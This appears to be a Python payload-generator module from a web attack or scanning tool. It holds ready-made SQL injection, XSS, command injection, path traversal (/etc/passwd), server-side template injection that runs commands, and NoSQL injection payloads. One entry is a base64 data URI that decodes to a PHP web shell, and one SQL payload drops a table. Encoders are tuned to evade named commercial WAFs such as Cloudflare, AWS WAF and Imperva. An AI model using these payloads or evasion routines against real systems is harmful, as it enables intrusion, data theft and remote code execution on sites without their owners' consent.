import os, glob as _glob
from typing import List, Dict, Optional, Tuple
import random
import urllib.parse

try:
    import yaml as _yaml
    _HAS_YAML = True
except ImportError:
    _HAS_YAML = False

_SEED_OVERRIDES_LOADED = False


def _load_yaml_overrides() -> dict:
    global _SEED_OVERRIDES_LOADED
    if _SEED_OVERRIDES_LOADED:
        return {}
    _SEED_OVERRIDES_LOADED = True
    overrides = {}
    base = os.path.join(os.path.dirname(__file__) or ".", "..", "payload_seeds")
    if not os.path.isdir(base):
        return overrides
    if not _HAS_YAML:
        return overrides
    for fpath in _glob.glob(os.path.join(base, "*.yml")):
        try:
            with open(fpath, "r", encoding="utf-8") as f:
                data = _yaml.safe_load(f)
            if not isinstance(data, dict):
                continue
            seeds = data.get("seeds", {})
            for group_name, group_data in seeds.items():
                if group_name not in overrides:
                    overrides[group_name] = {}
                for key_name, entries in group_data.items():
                    if not isinstance(entries, list):
                        continue
                    filtered = []
                    for e in entries:
                        if isinstance(e, dict) and "raw" in e:
                            if "ctx" not in e:
                                e["ctx"] = ["all"]
                            filtered.append(e)
                    if filtered:
                        overrides[group_name][key_name] = filtered
        except Exception as e:
            pass
    return overrides


ENCODERS = {
    "url": lambda s: urllib.parse.quote(s, safe=""),
    "double_url": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
    "hex_chars": lambda s: "".join("%%%02x" % ord(c) if c in "'\"= " else c for c in s),
    "null_prefix": lambda s: "%00" + s,
    "case_sql": lambda s: _sql_case_mix(s),
    "comment_sql": lambda s: _sql_comment(s),
    "whitespace_sql": lambda s: _sql_whitespace(s),
    "scientific": lambda s: s.replace("1=1", "1.0=1.0").replace("1=2", "1.0=2.0"),
}


def _sql_case_mix(raw: str) -> str:
    sql_kw = {"OR", "AND", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "BY",
              "SLEEP", "WAITFOR", "DELAY", "INSERT", "UPDATE", "DELETE", "DROP",
              "CREATE", "ALTER", "EXEC", "HAVING", "GROUP", "NULL", "NOT",
              "INTO", "VALUES", "SET", "LIKE", "ADMIN", "ALL", "DISTINCT",
              "PG_SLEEP", "IF", "SUBSTRING", "USER", "DATABASE", "TABLE",
              "COLUMN", "SCHEMA", "BENCHMARK", "LOAD_FILE", "INTOOUTFILE",
              "INFORMATION_SCHEMA", "AND", "OR", "ON", "AS"}
    result = []
    for word in raw.split(" "):
        stripped = word.strip("'\"();\n\t")
        if stripped.upper() in sql_kw:
            mutated = "".join(random.choice([c.upper(), c.lower()]) for c in word)
            result.append(mutated)
        else:
            result.append(word)
    return " ".join(result)


def _sql_comment(raw: str) -> str:
    r = raw
    r = r.replace(" OR ", " /**/OR/**/ ")
    r = r.replace(" AND ", " /**/AND/**/ ")
    r = r.replace("SELECT", "SEL/**/ECT")
    r = r.replace("UNION", "UN/**/ION")
    r = r.replace(" WHERE ", " /**/WHERE/**/ ")
    r = r.replace(" FROM ", " /**/FROM/**/ ")
    r = r.replace(" ORDER ", " /**/ORDER/**/ ")
    r = r.replace("SLEEP", "SLE/**/EP")
    r = r.replace("PG_SLEEP", "PG_SLE/**/EP")
    r = r.replace("WAITFOR", "WAI/**/TFOR")
    r = r.replace("DELAY", "DE/**/LAY")
    return r


def _sql_whitespace(raw: str) -> list:
    variants = []
    for repl in ("\t", "\n", "\r", "\f", "\xa0", "+"):
        variants.append(raw.replace(" ", repl))
    return variants


WAF_STRATEGIES = {
    "cloudflare": {"priority": ["comment_sql", "case_sql", "whitespace_sql"], "skip": []},
    "mod_security": {"priority": ["whitespace_sql", "scientific", "null_prefix"], "skip": []},
    "aws_waf": {"priority": ["double_url", "case_sql"], "skip": []},
    "imperva": {"priority": ["hex_chars", "case_sql", "whitespace_sql"], "skip": []},
    None: {"priority": ["case_sql", "comment_sql", "whitespace_sql", "hex_chars"], "skip": []},
}


SQLI_SEEDS: Dict[str, List[dict]] = {
    "error": [
        {"raw": "'", "ctx": ["string"]},
        {"raw": '"', "ctx": ["string"]},
        {"raw": "')", "ctx": ["string"]},
        {"raw": "'))", "ctx": ["string"]},
        {"raw": "\\'", "ctx": ["string"]},
        {"raw": "`", "ctx": ["string"]},
        {"raw": "' OR '1'='1", "ctx": ["string"]},
        {"raw": "' OR 1=1-- ", "ctx": ["string", "numeric"]},
        {"raw": "'; SELECT 1-- ", "ctx": ["string"]},
        {"raw": "1' OR '1'='1", "ctx": ["numeric"]},
        {"raw": "1' OR 1=1-- ", "ctx": ["numeric"]},
        {"raw": "' UNION SELECT 1-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT 1,2-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT 1,2,3-- ", "ctx": ["string"]},
    ],
    "boolean_true": [
        {"raw": "' AND '1'='1", "ctx": ["string"]},
        {"raw": "' AND 1=1-- ", "ctx": ["string", "numeric"]},
        {"raw": '" AND "1"="1', "ctx": ["string"]},
        {"raw": '") AND 1=1-- ', "ctx": ["string"]},
        {"raw": "' OR NOT 1=0-- ", "ctx": ["string"]},
    ],
    "boolean_false": [
        {"raw": "' AND '1'='2", "ctx": ["string"]},
        {"raw": "' AND 1=2-- ", "ctx": ["string", "numeric"]},
        {"raw": '" AND "1"="2', "ctx": ["string"]},
        {"raw": '") AND 1=2-- ', "ctx": ["string"]},
        {"raw": "' OR NOT 1=1-- ", "ctx": ["string"]},
    ],
    "time_mysql": [
        {"raw": "' OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR SLEEP(2)-- ", "dbms": "MySQL"},
        {"raw": "' AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "1' AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR 1=1 AND SLEEP(3)-- ", "dbms": "MySQL"},
    ],
    "time_mssql": [
        {"raw": "' WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
        {"raw": "'; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
        {"raw": "' OR 1=1; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
    ],
    "time_postgres": [
        {"raw": "' OR pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "') OR pg_sleep(3)-- ", "dbms": "PostgreSQL"},
    ],
    "time_generic": [
        {"raw": "' OR 1=1 OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "admin' OR SLEEP(3)-- ", "dbms": "MySQL"},
    ],
    "union": [
        {"raw": "' UNION SELECT NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL,NULL-- ", "ctx": ["string"]},
    ],
    "stacked": [
        {"raw": "'; SELECT 1-- ", "ctx": ["string"]},
        {"raw": "'; SELECT 1;-- ", "ctx": ["string"]},
        {"raw": "'; DROP TABLE IF EXISTS test_temp;-- ", "ctx": ["string"]},
        {"raw": '"; SELECT 1-- ', "ctx": ["string"]},
        {"raw": "1; SELECT 1-- ", "ctx": ["numeric"]},
    ],
}


XSS_SEEDS: Dict[str, List[dict]] = {
    "html": [
        {"raw": "<script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "<img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<svg onload=alert(1)>", "ctx": ["all"]},
        {"raw": "<body onload=alert(1)>", "ctx": ["all"]},
        {"raw": "<input autofocus onfocus=alert(1)>", "ctx": ["all"]},
        {"raw": "<details open ontoggle=alert(1)>", "ctx": ["all"]},
        {"raw": "<marquee onstart=alert(1)>", "ctx": ["all"]},
        {"raw": "<video onloadstart=alert(1) src=x>", "ctx": ["all"]},
        {"raw": "<audio onloadstart=alert(1) src=x>", "ctx": ["all"]},
        {"raw": "<select autofocus onfocus=alert(1)>", "ctx": ["all"]},
    ],
    "attr": [
        {"raw": '" onfocus=alert(1) autofocus="', "ctx": ["all"]},
        {"raw": "' onfocus=alert(1) autofocus='", "ctx": ["all"]},
        {"raw": '" autofocus onfocus=alert(1)', "ctx": ["all"]},
        {"raw": "' autofocus onfocus=alert(1)", "ctx": ["all"]},
        {"raw": '" onmouseover=alert(1) "', "ctx": ["all"]},
        {"raw": '" onclick=alert(1) "', "ctx": ["all"]},
    ],
    "js": [
        {"raw": "';alert(1)//", "ctx": ["all"]},
        {"raw": '";alert(1)//', "ctx": ["all"]},
        {"raw": "</script><script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "\\';alert(1);//", "ctx": ["all"]},
    ],
    "angular": [
        {"raw": "{{constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{$on.constructor('alert(1)')()}}", "ctx": ["all"]},
    ],
}


CMDI_SEEDS: Dict[str, List[dict]] = {
    "output": [
        {"raw": "; id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "| id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "` id`", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "$(id)", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "; whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "| whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "\n id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "'; id;'", "indicator": "uid=", "ctx": ["all"]},
        {"raw": '"; id;"', "indicator": "uid=", "ctx": ["all"]},
    ],
    "time": [
        {"raw": "; ping -c 3 127.0.0.1", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "| ping -n 3 127.0.0.1", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "; sleep 3", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "| sleep 3", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "& sleep 3 &", "threshold": 2.5, "ctx": ["all"]},
    ],
}


LFI_SEEDS: Dict[str, List[dict]] = {
    "traversal": [
        {"raw": "/../" * n + "etc/passwd", "indicator": "root:", "ctx": ["all"]}
        for n in range(1, 8)
    ] + [
        {"raw": "..\\" * n + "windows\\win.ini", "indicator": "[fonts]", "ctx": ["all"]}
        for n in (1, 3, 5)
    ],
    "encoded": [
        {"raw": "%2e%2e%2f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%252f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%c0%af" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%ef%bc%8f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
    ],
    "php_wrappers": [
        {"raw": "php://filter/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=index", "type": "base64", "ctx": ["all"]},
        {"raw": "expect://id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "type": "rce", "ctx": ["all"]},
    ],
}


SSTI_SEEDS: Dict[str, List[dict]] = {
    "detect": [
        {"raw": "{{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "${999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "#{999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "*{999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "<%= 999999 * 999999 %>", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "${{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "{{7*'7'}}", "indicator": "7777777", "ctx": ["all"]},
        {"raw": "{{config}}", "indicator": "config", "ctx": ["all"]},
    ],
    "blind": [
        {"raw": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ lipsum.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
    ],
}


NOSQLI_SEEDS: Dict[str, List[dict]] = {
    "boolean": [
        {"raw": "' || '1'=='1' /*", "ctx": ["string"]},
        {"raw": "' || 1==1 //", "ctx": ["string"]},
        {"raw": '" || "1"=="1" //', "ctx": ["string"]},
        {"raw": "' && this.cred == '' //", "ctx": ["string"]},
        {"raw": "admin' || 1==1 //", "ctx": ["string"]},
        {"raw": "admin' --", "ctx": ["string"]},
        {"raw": '"; return true; //', "ctx": ["string"]},
    ],
    "where_time": [
        {"raw": "'; if (1==1) { sleep(3000); } //", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "'; sleep(3000); //", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "' || sleep(3000) || '", "threshold": 2.5, "ctx": ["string"]},
    ],
    "json": [
        {"raw": '{"$ne": ""}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$gt": ""}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$regex": ".*"}', "type": "json", "ctx": ["json"]},
    ],
}


def _filter_by_context(seeds: List[dict], context: str) -> List[dict]:
    if not context or context == "all":
        return seeds
    return [s for s in seeds if "ctx" not in s or context in s["ctx"] or "all" in s.get("ctx", [])]


def generate(seed_group: str, seed_key: str, context: str = "all",
             waf_name: Optional[str] = None,
             max_payloads: int = 50) -> List[dict]:
    groups = {
        "sqli": SQLI_SEEDS,
        "xss": XSS_SEEDS,
        "cmdi": CMDI_SEEDS,
        "lfi": LFI_SEEDS,
        "ssti": SSTI_SEEDS,
        "nosqli": NOSQLI_SEEDS,
    }
    overrides = _load_yaml_overrides()
    if seed_group in overrides:
        groups[seed_group] = dict(groups[seed_group])
        groups[seed_group].update(overrides[seed_group])
    group = groups.get(seed_group, {})
    seeds = group.get(seed_key, [])
    seeds = _filter_by_context(seeds, context)

    if not seeds:
        return []

    encoders = WAF_STRATEGIES.get(waf_name, WAF_STRATEGIES[None])

    results = []
    for seed in seeds:
        raw = seed["raw"]
        enc_names = encoders.get("priority", WAF_STRATEGIES[None]["priority"])

        if seed_group == "sqli" and seed_key in ("time_mysql", "time_mssql",
                                                  "time_postgres", "time_generic",
                                                  "union", "stacked"):
            enc_names = ["case_sql"]

        if seed_group == "xss":
            enc_names = []

        if seed_group == "nosqli":
            enc_names = []

        if seed_group == "ssti":
            enc_names = []

        if seed_group == "lfi":
            enc_names = []

        if seed_group == "cmdi":
            enc_names = ["whitespace_sql"]

        generated = [raw]
        for enc_name in enc_names:
            encoder = ENCODERS.get(enc_name)
            if encoder:
                new_vals = []
                for g in generated:
                    encoded = encoder(g)
                    if isinstance(encoded, list):
                        new_vals.extend(encoded)
                    else:
                        new_vals.append(encoded)
                generated = new_vals

        for g in generated[:3]:
            entry = dict(seed)
            entry["payload"] = g
            if "raw" in entry:
                del entry["raw"]
            if "ctx" in entry:
                del entry["ctx"]
            results.append(entry)

    if max_payloads and len(results) > max_payloads:
        results = results[:max_payloads]

    return results


def generate_sqli_error(context: str = "string",
                        waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "error", context, waf_name)]


def generate_sqli_boolean(context: str = "string",
                          waf_name: Optional[str] = None) -> List[Tuple[str, str]]:
    trues = generate("sqli", "boolean_true", context, waf_name)
    falses = generate("sqli", "boolean_false", context, waf_name)
    pairs = []
    for t, f in zip(trues, falses):
        pairs.append((t["payload"], f["payload"]))
    return pairs


def generate_sqli_time(waf_name: Optional[str] = None) -> List[str]:
    results = []
    for key in ("time_mysql", "time_mssql", "time_postgres", "time_generic"):
        for p in generate("sqli", key, "all", waf_name):
            results.append(p["payload"])
    return results


def generate_sqli_union(context: str = "string",
                        waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "union", context, waf_name)]


def generate_sqli_stacked(context: str = "string",
                          waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "stacked", context, waf_name)]
